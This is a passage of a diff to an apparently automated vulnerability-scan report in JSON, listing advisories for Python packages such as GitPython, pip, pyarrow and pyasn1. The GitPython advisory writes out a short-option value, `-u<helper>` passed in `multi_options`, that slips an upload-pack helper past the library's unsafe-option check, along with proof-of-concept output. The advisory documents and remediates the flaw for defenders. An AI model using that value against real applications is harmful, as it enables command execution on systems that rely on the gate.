`CVE-2026-42284` and `GHSA-rpm5-65cw-6hj4` / `CVE-2026-42215`. Their public affected ranges are marked as fixed before 3.1.50.\n- `GHSA-x2qx-6953-8485` describes validating `multi_options` before `shlex.split(...)`. GitPython 3.1.50 now validates after splitting, but the joined short option `-u<value>` still bypasses because the validator canonicalizes it to `u<value>` rather than `u`.\n- `GHSA-rpm5-65cw-6hj4` describes unsafe underscored kwargs such as `upload_pack=...`. The current PoC uses `multi_options=[\"-u<helper>\"]` against 3.1.50 and does not depend on underscored kwargs.\n- GitHub issue search for `upload-pack unsafe options` found historical related items, including CVE-2022-24439 and the earlier unsafe-options gate work, but no public issue describing this current joined-short-option residual bypass in 3.1.50.\n- GitHub issue search for `multi_options unsafe` found PR #2130, which fixed splitting of `multi_options` before checking. The current issue remains after that split because `-u<value>` is treated as option name `u<value>`, not blocked short option `u`.\n- GitHub issue searches for `u<upload-pack> unsafe` and `-cfoo` returned no results.\n\nSuggested remediation:\n\nWhen checking unsafe Git options, parse joined short options that take values. For clone, `-uVALUE` and `-cKEY=VALUE` should be canonicalized to `u` and `c` respectively before comparing against the unsafe option set.\n\nA safer approach is to maintain command-specific metadata for unsafe short options and recognize the bare option, split form, joined form, and long `--option=<value>` / `--option <value>` forms.",
+              "severity": [
+                {
+                  "type": "CVSS_V4",
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"
+                }
+              ],
               "affected": [
                 {
-                  "database_specific": {
-                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-v396-v7q4-x2qj/GHSA-v396-v7q4-x2qj.json"
-                  },
                   "package": {
                     "ecosystem": "PyPI",
                     "name": "gitpython",
@@ -1517,6 +1487,7 @@
                   },
                   "ranges": [
                     {
+                      "type": "ECOSYSTEM",
                       "events": [
                         {
                           "introduced": "3.1.50"
@@ -1524,28 +1495,17 @@
                         {
                           "fixed": "3.1.51"
                         }
-                      ],
-                      "type": "ECOSYSTEM"
+                      ]
                     }
                   ],
                   "versions": [
                     "3.1.50"
-                  ]
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-v396-v7q4-x2qj/GHSA-v396-v7q4-x2qj.json"
+                  }
                 }
               ],
-              "database_specific": {
-                "cwe_ids": [
-                  "CWE-78"
-                ],
-                "github_reviewed": true,
-                "github_reviewed_at": "2026-07-21T19:43:14Z",
-                "nvd_published_at": null,
-                "severity": "HIGH"
-              },
-              "details": "`GitPython` version `3.1.50` blocks unsafe `git clone` options such as `--upload-pack`, `-u`, `--config`, and `-c` unless callers explicitly pass `allow_unsafe_options=True`. However, the default unsafe-option gate does not recognize joined short-option forms such as `-u/path/to/helper`.\n\nGit itself accepts `-u<upload-pack>` as the short form of `--upload-pack=<upload-pack>`. As a result, `Repo.clone_from(..., multi_options=[\"-u<helper>\"], allow_unsafe_options=False)` can execute the helper command even though the equivalent long option is blocked.\n\nAffected package:\n\n- Ecosystem: PyPI\n- Package: `GitPython`\n- Confirmed affected version: `3.1.50`\n- Repository: `gitpython-developers/GitPython`\n- Current PyPI version during triage: `3.1.50`\n\nRelevant behavior:\n\n- `Repo.unsafe_git_clone_options` correctly lists `--upload-pack`, `-u`, `--config`, and `-c` as unsafe clone options.\n- `Repo._clone()` splits `multi_options` with `shlex.split(\" \".join(multi_options))` and then calls `Git.check_unsafe_options(...)`.\n- `_canonicalize_option_name(\"-u/path/to/helper\")` returns a string beginning with `u...`, not the canonical short option `u`, so it does not match the blocked `-u` entry.\n- Git accepts the same joined short option as `--upload-pack=<helper>` and executes the helper during clone.\n\nPreconditions:\n\nAn application must pass attacker-influenced clone options into `Repo.clone_from(..., multi_options=...)` while relying on GitPython's default unsafe-option gate to block command-executing options.\n\nThe local PoC uses only a local bare Git repository and a local helper script. It does not contact any third-party service.\n\nLocal reproduction:\n\nThe PoC creates a disposable bare Git repository, a helper script, and a sentinel file path. It first confirms that the long `--upload-pack=<helper>` form is blocked by GitPython. It then calls `Repo.clone_from(..., multi_options=[\"-u<helper>\"], allow_unsafe_options=False)`.\n\nObserved sanitized output:\n\n```text\ngitpython_version=3.1.50\ngit_version=git version 2.53.0.windows.1\ntmp_dir=<tmp>\nlong_upload_pack_gate=BLOCKED:UnsafeOptionError\njoined_short_upload_pack_gate=ALLOWED\nclone_result=EXPECTED_EXCEPTION:GitCommandError\nsentinel_exists=True\nsentinel_text=GITPYTHON_UNSAFE_OPTION_BYPASS\n```\n\nThe clone fails because the helper exits nonzero, but the sentinel file proves that Git executed the helper despite `allow_unsafe_options=False`.\n\nImpact:\n\nAn attacker who controls `multi_options` can bypass GitPython's default `allow_unsafe_options=False` protection and execute a local command via Git's `--upload-pack` / `-u` clone option. This is a residual bypass of an explicit GitPython security boundary, not merely a case where a caller opted into unsafe behavior.\n\nDuplicate / related advisory checks:\n\n- OSV query for `PyPI/GitPython` version `3.1.50` returned no vulnerabilities.\n- The repository's public advisories include related unsafe Git option issues, including `GHSA-x2qx-6953-8485` / `CVE-2026-42284` and `GHSA-rpm5-65cw-6hj4` / `CVE-2026-42215`. Their public affected ranges are marked as fixed before 3.1.50.\n- `GHSA-x2qx-6953-8485` describes validating `multi_options` before `shlex.split(...)`. GitPython 3.1.50 now validates after splitting, but the joined short option `-u<value>` still bypasses because the validator canonicalizes it to `u<value>` rather than `u`.\n- `GHSA-rpm5-65cw-6hj4` describes unsafe underscored kwargs such as `upload_pack=...`. The current PoC uses `multi_options=[\"-u<helper>\"]` against 3.1.50 and does not depend on underscored kwargs.\n- GitHub issue search for `upload-pack unsafe options` found historical related items, including CVE-2022-24439 and the earlier unsafe-options gate work, but no public issue describing this current joined-short-option residual bypass in 3.1.50.\n- GitHub issue search for `multi_options unsafe` found PR #2130, which fixed splitting of `multi_options` before checking. The current issue remains after that split because `-u<value>` is treated as option name `u<value>`, not blocked short option `u`.\n- GitHub issue searches for `u<upload-pack> unsafe` and `-cfoo` returned no results.\n\nSuggested remediation:\n\nWhen checking unsafe Git options, parse joined short options that take values. For clone, `-uVALUE` and `-cKEY=VALUE` should be canonicalized to `u` and `c` respectively before comparing against the unsafe option set.\n\nA safer approach is to maintain command-specific metadata for unsafe short options and recognize the bare option, split form, joined form, and long `--option=<value>` / `--option <value>` forms.",
-              "id": "GHSA-v396-v7q4-x2qj",
-              "modified": "2026-07-23T03:14:30.616927277Z",
-              "published": "2026-07-21T19:43:14Z",
               "references": [
                 {
                   "type": "WEB",
@@ -1564,18 +1524,57 @@
                   "url": "https://github.com/gitpython-developers/GitPython/releases/tag/3.1.51"
                 }
               ],
-              "related": [
-                "CGA-5w9h-q384-cggx"
-              ],
-              "schema_version": "1.7.5",
-              "severity": [
-                {
-                  "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
-                  "type": "CVSS_V4"
-                }
-              ],
-              "summary": "GitPython unsafe clone option gate bypass through joined short options"
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-78"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-07-21T19:43:14Z",
+                "nvd_published_at": null,
+                "severity": "HIGH"
+              }
             }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "GHSA-2f96-g7mh-g2hx"
+              ],
+              "aliases": [
+                "GHSA-2f96-g7mh-g2hx"
+              ],
+              "max_severity": "8.8"
+            },
+            {
+              "ids": [
+                "GHSA-956x-8gvw-wg5v"
+              ],
+              "aliases": [
+                "GHSA-956x-8gvw-wg5v"
+              ],
+              "max_severity": "8.4"
+            },
+            {
+              "ids": [
+                "GHSA-rwj8-pgh3-r573"
+              ],
+              "aliases": [
+                "GHSA-rwj8-pgh3-r573"
+              ],
+              "max_severity": "7.5"
+            },
+            {
+              "ids": [
+                "GHSA-v396-v7q4-x2qj"
+              ],
+              "aliases": [
+                "GHSA-v396-v7q4-x2qj"
+              ],
+              "max_severity": "8.7"
+            }
+          ],
+          "licenses": [
+            "BSD-3-Clause"
           ]
         },
         {
@@ -2350,56 +2349,6 @@
         },
         {
           "package": {
-            "name": "nemo-fabric",
-            "version": "0.1.0a20260722",
-            "ecosystem": "PyPI"
-          },
-          "licenses": [
-            "Apache-2.0"
-          ]
-        },
-        {
-          "package": {
-            "name": "nemo-fabric-adapters-codex",
-            "version": "0.1.0a20260722",
-            "ecosystem": "PyPI"
-          },
-          "licenses": [
-            "Apache-2.0"
-          ]
-        },
-        {
-          "package": {
-            "name": "nemo-fabric-adapters-common",
-            "version": "0.1.0a20260722",
-            "ecosystem": "PyPI"
-          },
-          "licenses": [
-            "Apache-2.0"
-          ]
-        },
-        {
-          "package": {
-            "name": "nemo-fabric-adapters-hermes",
-            "version": "0.1.0a20260722",
-            "ecosystem": "PyPI"
-          },
-          "licenses": [
-            "Apache-2.0"
-          ]
-        },
-        {
-          "package": {
-            "name": "nemo-fabric-runtime",
-            "version": "0.1.0a20260722",
-            "ecosystem": "PyPI"
-          },
-          "licenses": [
-            "Apache-2.0"
-          ]
-        },
-        {
-          "package": {
             "name": "nemo-relay",
             "version": "0.4.0",
             "ecosystem": "PyPI"
@@ -2602,26 +2551,6 @@
           "package": {
             "name": "openai",
             "version": "2.35.0",
-            "ecosystem": "PyPI"
-          },
-          "licenses": [
-            "Apache-2.0"
-          ]
-        },
-        {
-          "package": {
-            "name": "openai-codex",
-            "version": "0.144.4",
-            "ecosystem": "PyPI"
-          },
-          "licenses": [
-            "Apache-2.0"
-          ]
-        },
-        {
-          "package": {
-            "name": "openai-codex-cli-bin",
-            "version": "0.144.4",
             "ecosystem": "PyPI"
           },
           "licenses": [
@@ -2934,31 +2863,25 @@
             "version": "26.1.1",
             "ecosystem": "PyPI"
           },
-          "groups": [
-            {
-              "ids": [
-                "PYSEC-2026-196",
-                "GHSA-wf93-45jw-7689"
-              ],
-              "aliases": [
-                "CVE-2026-8643",
-                "GHSA-wf93-45jw-7689",
-                "PYSEC-2026-196"
-              ],
-              "max_severity": "8.0"
-            }
-          ],
-          "licenses": [
-            "MIT"
-          ],
           "vulnerabilities": [
             {
+              "modified": "2026-07-13T16:45:04Z",
+              "published": "2026-06-01T17:17:35Z",
+              "schema_version": "1.7.5",
+              "id": "PYSEC-2026-196",
+              "aliases": [
+                "CVE-2026-8643",
+                "GHSA-wf93-45jw-7689"
+              ],
+              "details": "pip would treat console_scripts and gui_scripts as paths instead of file names without sanitizing the resolved absolute path to the installation directory, leading to entry points being installed outside the installation directory.",
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N"
+                }
+              ],
               "affected": [
                 {
-                  "database_specific": {
-                    "source": "https://github.com/pypa/advisory-database/blob/main/vulns/pip/PYSEC-2026-196.yaml"
-                  },
-                  "ecosystem_specific": {},
                   "package": {
                     "ecosystem": "PyPI",
                     "name": "pip",
@@ -2966,6 +2889,7 @@
                   },
                   "ranges": [
                     {
+                      "type": "ECOSYSTEM",
                       "events": [
                         {
                           "introduced": "0"
@@ -2973,8 +2897,7 @@
                         {
                           "fixed": "26.1.2"
                         }
-                      ],
-                      "type": "ECOSYSTEM"
+                      ]
                     }
                   ],
                   "versions": [
@@ -3134,17 +3057,12 @@
                     "9.0.1",
                     "9.0.2",
                     "9.0.3"
-                  ]
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/pypa/advisory-database/blob/main/vulns/pip/PYSEC-2026-196.yaml"
+                  }
                 }
               ],
-              "aliases": [
-                "CVE-2026-8643",
-                "GHSA-wf93-45jw-7689"
-              ],
-              "details": "pip would treat console_scripts and gui_scripts as paths instead of file names without sanitizing the resolved absolute path to the installation directory, leading to entry points being installed outside the installation directory.",
-              "id": "PYSEC-2026-196",
-              "modified": "2026-07-13T16:45:04.859457874Z",
-              "published": "2026-06-01T17:17:35.770Z",
               "references": [
                 {
                   "type": "ADVISORY",
@@ -3162,21 +3080,34 @@
                   "type": "ADVISORY",
                   "url": "https://github.com/advisories/GHSA-wf93-45jw-7689"
                 }
-              ],
-              "schema_version": "1.7.5",
-              "severity": [
-                {
-                  "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",
-                  "type": "CVSS_V3"
-                }
               ]
             },
             {
+              "modified": "2026-07-14T02:29:29Z",
+              "published": "2026-06-01T18:31:53Z",
+              "schema_version": "1.7.5",
+              "id": "GHSA-wf93-45jw-7689",
+              "aliases": [
+                "CVE-2026-8643",
+                "PYSEC-2026-196"
+              ],
+              "related": [
+                "CGA-9gv8-q962-65h9"
+              ],
+              "summary": " pip: Path traversal in console_scripts/gui_scripts\u00a0entry point names allows installing scripts outside of target directory",
+              "details": "pip would treat console_scripts and gui_scripts as paths instead of file names without sanitizing the resolved absolute path to the installation directory, leading to entry points being installed outside the installation directory.",
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H"
+                },
+                {
+                  "type": "CVSS_V4",
+                  "score": "CVSS:4.0/AV:L/AC:L/AT:P/PR:L/UI:A/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N"
+                }
+              ],
               "affected": [
                 {
-                  "database_specific": {
-                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-wf93-45jw-7689/GHSA-wf93-45jw-7689.json"
-                  },
                   "package": {
                     "ecosystem": "PyPI",
                     "name": "pip",
@@ -3184,6 +3115,7 @@
                   },
                   "ranges": [
                     {
+                      "type": "ECOSYSTEM",
                       "events": [
                         {
                           "introduced": "0"
@@ -3191,8 +3123,7 @@
                         {
                           "fixed": "26.1.2"
                         }
-                      ],
-                      "type": "ECOSYSTEM"
+                      ]
                     }
                   ],
                   "versions": [
@@ -3352,26 +3283,12 @@
                     "9.0.1",
                     "9.0.2",
                     "9.0.3"
-                  ]
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-wf93-45jw-7689/GHSA-wf93-45jw-7689.json"
+                  }
                 }
               ],
-              "aliases": [
-                "CVE-2026-8643",
-                "PYSEC-2026-196"
-              ],
-              "database_specific": {
-                "cwe_ids": [
-                  "CWE-22"
-                ],
-                "github_reviewed": true,
-                "github_reviewed_at": "2026-07-08T21:00:36Z",
-                "nvd_published_at": "2026-06-01T17:17:35Z",
-                "severity": "MODERATE"
-              },
-              "details": "pip would treat console_scripts and gui_scripts as paths instead of file names without sanitizing the resolved absolute path to the installation directory, leading to entry points being installed outside the installation directory.",
-              "id": "GHSA-wf93-45jw-7689",
-              "modified": "2026-07-14T02:29:29.982772188Z",
-              "published": "2026-06-01T18:31:53Z",
               "references": [
                 {
                   "type": "ADVISORY",
@@ -3518,22 +3435,33 @@
                   "url": "http://www.openwall.com/lists/oss-security/2026/06/01/5"
                 }
               ],
-              "related": [
-                "CGA-9gv8-q962-65h9"
-              ],
-              "schema_version": "1.7.5",
-              "severity": [
-                {
-                  "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H",
-                  "type": "CVSS_V3"
-                },
-                {
-                  "score": "CVSS:4.0/AV:L/AC:L/AT:P/PR:L/UI:A/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N",
-                  "type": "CVSS_V4"
-                }
-              ],
-              "summary": " pip: Path traversal in console_scripts/gui_scripts\u00a0entry point names allows installing scripts outside of target directory"
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-22"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-07-08T21:00:36Z",
+                "nvd_published_at": "2026-06-01T17:17:35Z",
+                "severity": "MODERATE"
+              }
             }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "PYSEC-2026-196",
+                "GHSA-wf93-45jw-7689"
+              ],
+              "aliases": [
+                "CVE-2026-8643",
+                "GHSA-wf93-45jw-7689",
+                "PYSEC-2026-196"
+              ],
+              "max_severity": "8.0"
+            }
+          ],
+          "licenses": [
+            "MIT"
           ]
         },
         {
@@ -3702,30 +3630,25 @@
             "version": "22.0.0",
             "ecosystem": "PyPI"
           },
-          "groups": [
-            {
-              "ids": [
-                "PYSEC-2026-113",
-                "GHSA-rgxp-2hwp-jwgg"
-              ],
-              "aliases": [
-                "CVE-2026-25087",
-                "GHSA-rgxp-2hwp-jwgg",
-                "PYSEC-2026-113"
-              ],
-              "max_severity": "7.0"
-            }
-          ],
-          "licenses": [
-            "non-standard"
-          ],
           "vulnerabilities": [
             {
+              "modified": "2026-06-10T17:01:40Z",
+              "published": "2026-02-17T14:16:01Z",
+              "schema_version": "1.7.5",
+              "id": "PYSEC-2026-113",
+              "aliases": [
+                "CVE-2026-25087",
+                "GHSA-rgxp-2hwp-jwgg"
+              ],
+              "details": "Use After Free vulnerability in Apache Arrow C++.\n\nThis issue affects Apache Arrow C++ from 15.0.0 through 23.0.0. It can be triggered when reading an Arrow IPC file (but not an IPC stream) with pre-buffering enabled, if the IPC file contains data with variadic buffers (such as Binary View and String View data). Depending on the number of variadic buffers in a record batch column and on the temporal sequence of multi-threaded IO, a write to a dangling pointer could occur. The value (a `std::shared_ptr<Buffer>` object)\u00a0that is written to the dangling pointer is not under direct control of the attacker.\n\nPre-buffering is disabled by default but can be enabled using a specific C++ API call (`RecordBatchFileReader::PreBufferMetadata`). The functionality is not exposed in language bindings (Python, Ruby, C GLib), so these bindings are not vulnerable.\n\nThe most likely consequence of this issue would be random crashes or memory corruption when reading specific kinds of IPC files. If the application allows ingesting IPC files from untrusted sources, this could plausibly be exploited for denial of service. Inducing more targeted kinds of misbehavior (such as confidential data extraction from the running process) depends on memory allocation and multi-threaded IO temporal patterns that are unlikely to be easily controlled by an attacker.\n\nAdvice for users of Arrow C++:\n\n1. check whether you enable pre-buffering on the IPC file reader (using\u00a0`RecordBatchFileReader::PreBufferMetadata`)\n \n2. if so, either disable pre-buffering (which may have adverse performance consequences), or switch to Arrow 23.0.1 which is not vulnerable",
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:H"
+                }
+              ],
               "affected": [
                 {
-                  "database_specific": {
-                    "source": "https://github.com/pypa/advisory-database/blob/main/vulns/pyarrow/PYSEC-2026-113.yaml"
-                  },
                   "package": {
                     "ecosystem": "PyPI",
                     "name": "pyarrow",
@@ -3733,6 +3656,7 @@
                   },
                   "ranges": [
                     {
+                      "type": "ECOSYSTEM",
                       "events": [
                         {
                           "introduced": "15.0.0"
@@ -3740,8 +3664,7 @@
                         {
                           "fixed": "23.0.1"
                         }
-                      ],
-                      "type": "ECOSYSTEM"
+                      ]
                     }
                   ],
                   "versions": [
@@ -3759,17 +3682,12 @@
                     "21.0.0",
                     "22.0.0",
                     "23.0.0"
-                  ]
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/pypa/advisory-database/blob/main/vulns/pyarrow/PYSEC-2026-113.yaml"
+                  }
                 }
               ],
-              "aliases": [
-                "CVE-2026-25087",
-                "GHSA-rgxp-2hwp-jwgg"
-              ],
-              "details": "Use After Free vulnerability in Apache Arrow C++.\n\nThis issue affects Apache Arrow C++ from 15.0.0 through 23.0.0. It can be triggered when reading an Arrow IPC file (but not an IPC stream) with pre-buffering enabled, if the IPC file contains data with variadic buffers (such as Binary View and String View data). Depending on the number of variadic buffers in a record batch column and on the temporal sequence of multi-threaded IO, a write to a dangling pointer could occur. The value (a `std::shared_ptr<Buffer>` object)\u00a0that is written to the dangling pointer is not under direct control of the attacker.\n\nPre-buffering is disabled by default but can be enabled using a specific C++ API call (`RecordBatchFileReader::PreBufferMetadata`). The functionality is not exposed in language bindings (Python, Ruby, C GLib), so these bindings are not vulnerable.\n\nThe most likely consequence of this issue would be random crashes or memory corruption when reading specific kinds of IPC files. If the application allows ingesting IPC files from untrusted sources, this could plausibly be exploited for denial of service. Inducing more targeted kinds of misbehavior (such as confidential data extraction from the running process) depends on memory allocation and multi-threaded IO temporal patterns that are unlikely to be easily controlled by an attacker.\n\nAdvice for users of Arrow C++:\n\n1. check whether you enable pre-buffering on the IPC file reader (using\u00a0`RecordBatchFileReader::PreBufferMetadata`)\n \n2. if so, either disable pre-buffering (which may have adverse performance consequences), or switch to Arrow 23.0.1 which is not vulnerable",
-              "id": "PYSEC-2026-113",
-              "modified": "2026-06-10T17:01:40.430051819Z",
-              "published": "2026-02-17T14:16:01.947Z",
               "references": [
                 {
                   "type": "ADVISORY",
@@ -3787,21 +3705,30 @@
                   "type": "ADVISORY",
                   "url": "https://github.com/advisories/GHSA-rgxp-2hwp-jwgg"
                 }
-              ],
-              "schema_version": "1.7.5",
-              "severity": [
-                {
-                  "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:H",
-                  "type": "CVSS_V3"
-                }
               ]
             },
             {
+              "modified": "2026-06-12T10:29:15Z",
+              "published": "2026-02-17T15:31:35Z",
+              "schema_version": "1.7.5",
+              "id": "GHSA-rgxp-2hwp-jwgg",
+              "aliases": [
+                "CVE-2026-25087",
+                "PYSEC-2026-113"
+              ],
+              "related": [
+                "CGA-4vwc-3x55-4m28"
+              ],
+              "summary": "Apache Arrow: Potential use-after-free when reading IPC file with pre-buffering",
+              "details": "Use After Free vulnerability in Apache Arrow C++.\n\nThis issue affects Apache Arrow C++ from 15.0.0 through 23.0.0. It can be triggered when reading an Arrow IPC file (but not an IPC stream) with pre-buffering enabled, if the IPC file contains data with variadic buffers (such as Binary View and String View data). Depending on the number of variadic buffers in a record batch column and on the temporal sequence of multi-threaded IO, a write to a dangling pointer could occur. The value (a `std::shared_ptr<Buffer>` object)\u00a0that is written to the dangling pointer is not under direct control of the attacker.\n\nPre-buffering is disabled by default but can be enabled using a specific C++ API call (`RecordBatchFileReader::PreBufferMetadata`). The functionality is not exposed in language bindings (Python, Ruby, C GLib), so these bindings are not vulnerable.\n\nThe most likely consequence of this issue would be random crashes or memory corruption when reading specific kinds of IPC files. If the application allows ingesting IPC files from untrusted sources, this could plausibly be exploited for denial of service. Inducing more targeted kinds of misbehavior (such as confidential data extraction from the running process) depends on memory allocation and multi-threaded IO temporal patterns that are unlikely to be easily controlled by an attacker.\n\nAdvice for users of Arrow C++:\n\n1. check whether you enable pre-buffering on the IPC file reader (using\u00a0`RecordBatchFileReader::PreBufferMetadata`)\n\n2. if so, either disable pre-buffering (which may have adverse performance consequences), or switch to Arrow 23.0.1 which is not vulnerable",
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:H"
+                }
+              ],
               "affected": [
                 {
-                  "database_specific": {
-                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-rgxp-2hwp-jwgg/GHSA-rgxp-2hwp-jwgg.json"
-                  },
                   "package": {
                     "ecosystem": "PyPI",
                     "name": "pyarrow",
@@ -3809,6 +3736,7 @@
                   },
                   "ranges": [
                     {
+                      "type": "ECOSYSTEM",
                       "events": [
                         {
                           "introduced": "15.0.0"
@@ -3816,8 +3744,7 @@
                         {
                           "fixed": "23.0.1"
                         }
-                      ],
-                      "type": "ECOSYSTEM"
+                      ]
                     }
                   ],
                   "versions": [
@@ -3835,26 +3762,12 @@
                     "21.0.0",
                     "22.0.0",
                     "23.0.0"
-                  ]
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-rgxp-2hwp-jwgg/GHSA-rgxp-2hwp-jwgg.json"
+                  }
                 }
               ],
-              "aliases": [
-                "CVE-2026-25087",
-                "PYSEC-2026-113"
-              ],
-              "database_specific": {
-                "cwe_ids": [
-                  "CWE-416"
-                ],
-                "github_reviewed": true,
-                "github_reviewed_at": "2026-06-05T21:39:35Z",
-                "nvd_published_at": "2026-02-17T14:16:01Z",
-                "severity": "HIGH"
-              },
-              "details": "Use After Free vulnerability in Apache Arrow C++.\n\nThis issue affects Apache Arrow C++ from 15.0.0 through 23.0.0. It can be triggered when reading an Arrow IPC file (but not an IPC stream) with pre-buffering enabled, if the IPC file contains data with variadic buffers (such as Binary View and String View data). Depending on the number of variadic buffers in a record batch column and on the temporal sequence of multi-threaded IO, a write to a dangling pointer could occur. The value (a `std::shared_ptr<Buffer>` object)\u00a0that is written to the dangling pointer is not under direct control of the attacker.\n\nPre-buffering is disabled by default but can be enabled using a specific C++ API call (`RecordBatchFileReader::PreBufferMetadata`). The functionality is not exposed in language bindings (Python, Ruby, C GLib), so these bindings are not vulnerable.\n\nThe most likely consequence of this issue would be random crashes or memory corruption when reading specific kinds of IPC files. If the application allows ingesting IPC files from untrusted sources, this could plausibly be exploited for denial of service. Inducing more targeted kinds of misbehavior (such as confidential data extraction from the running process) depends on memory allocation and multi-threaded IO temporal patterns that are unlikely to be easily controlled by an attacker.\n\nAdvice for users of Arrow C++:\n\n1. check whether you enable pre-buffering on the IPC file reader (using\u00a0`RecordBatchFileReader::PreBufferMetadata`)\n\n2. if so, either disable pre-buffering (which may have adverse performance consequences), or switch to Arrow 23.0.1 which is not vulnerable",
-              "id": "GHSA-rgxp-2hwp-jwgg",
-              "modified": "2026-06-12T10:29:15.451071539Z",
-              "published": "2026-02-17T15:31:35Z",
               "references": [
                 {
                   "type": "ADVISORY",
@@ -3881,18 +3794,33 @@
                   "url": "http://www.openwall.com/lists/oss-security/2026/02/17/4"
                 }
               ],
-              "related": [
-                "CGA-4vwc-3x55-4m28"
-              ],
-              "schema_version": "1.7.5",
-              "severity": [
-                {
-                  "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:H",
-                  "type": "CVSS_V3"
-                }
-              ],
-              "summary": "Apache Arrow: Potential use-after-free when reading IPC file with pre-buffering"
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-416"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-06-05T21:39:35Z",
+                "nvd_published_at": "2026-02-17T14:16:01Z",
+                "severity": "HIGH"
+              }
             }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "PYSEC-2026-113",
+                "GHSA-rgxp-2hwp-jwgg"
+              ],
+              "aliases": [
+                "CVE-2026-25087",
+                "GHSA-rgxp-2hwp-jwgg",
+                "PYSEC-2026-113"
+              ],
+              "max_severity": "7.0"
+            }
+          ],
+          "licenses": [
+            "non-standard"
           ]
         },
         {
@@ -3901,6 +3829,548 @@
             "version": "0.6.3",
             "ecosystem": "PyPI"
           },
+          "vulnerabilities": [
+            {
+              "modified": "2026-07-22T11:00:08Z",
+              "published": "2026-07-14T17:17:14Z",
+              "schema_version": "1.7.5",
+              "id": "PYSEC-2026-3455",
+              "aliases": [
+                "CVE-2026-59884",
+                "GHSA-m4p7-r5rc-7g4j"
+              ],
+              "details": "pyasn1 is a generic ASN.1 library for Python. Prior to 0.6.4, the BER decoder shared by the CER and DER codecs parses long-form tags by accumulating continuation octets without an upper bound on the tag ID size, allowing a crafted input to force construction of an arbitrarily large integer with CPU cost growing quadratically and to trigger unhandled ValueError exceptions in Python 3.11+ error formatting paths. Any application decoding untrusted BER, CER, or DER input is affected. This issue is fixed in version 0.6.4.",
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+                }
+              ],
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "pyasn1",
+                    "purl": "pkg:pypi/pyasn1"
+                  },
+                  "ranges": [
+                    {
+                      "type": "ECOSYSTEM",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "0.6.4"
+                        }
+                      ]
+                    }
+                  ],
+                  "versions": [
+                    "0.0.10a",
+                    "0.0.11a",
+                    "0.0.12a",
+                    "0.0.13",
+                    "0.0.13a",
+                    "0.0.13b",
+                    "0.0.6a",
+                    "0.0.9a",
+                    "0.1.1",
+                    "0.1.2",
+                    "0.1.3",
+                    "0.1.4",
+                    "0.1.5",
+                    "0.1.6",
+                    "0.1.7",
+                    "0.1.8",
+                    "0.1.9",
+                    "0.2.1",
+                    "0.2.2",
+                    "0.2.3",
+                    "0.3.1",
+                    "0.3.2",
+                    "0.3.3",
+                    "0.3.4",
+                    "0.3.5",
+                    "0.3.6",
+                    "0.3.7",
+                    "0.4.1",
+                    "0.4.2",
+                    "0.4.3",
+                    "0.4.4",
+                    "0.4.5",
+                    "0.4.6",
+                    "0.4.7",
+                    "0.4.8",
+                    "0.5.0",
+                    "0.5.1",
+                    "0.6.0",
+                    "0.6.1",
+                    "0.6.2",
+                    "0.6.3"
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/pypa/advisory-database/blob/main/vulns/pyasn1/PYSEC-2026-3455.yaml"
+                  }
+                }
+              ],
+              "references": [
+                {
+                  "type": "ADVISORY",
+                  "url": "https://github.com/pyasn1/pyasn1/releases/tag/v0.6.4"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://github.com/pyasn1/pyasn1/security/advisories/GHSA-m4p7-r5rc-7g4j"
+                },
+                {
+                  "type": "FIX",
+                  "url": "https://github.com/pyasn1/pyasn1/commit/628e36ecbb5277a3f01572ce418ef54271b165a5"
+                }
+              ]
+            },
+            {
+              "modified": "2026-07-22T11:00:08Z",
+              "published": "2026-07-14T17:17:14Z",
+              "schema_version": "1.7.5",
+              "id": "PYSEC-2026-3456",
+              "aliases": [
+                "CVE-2026-59885",
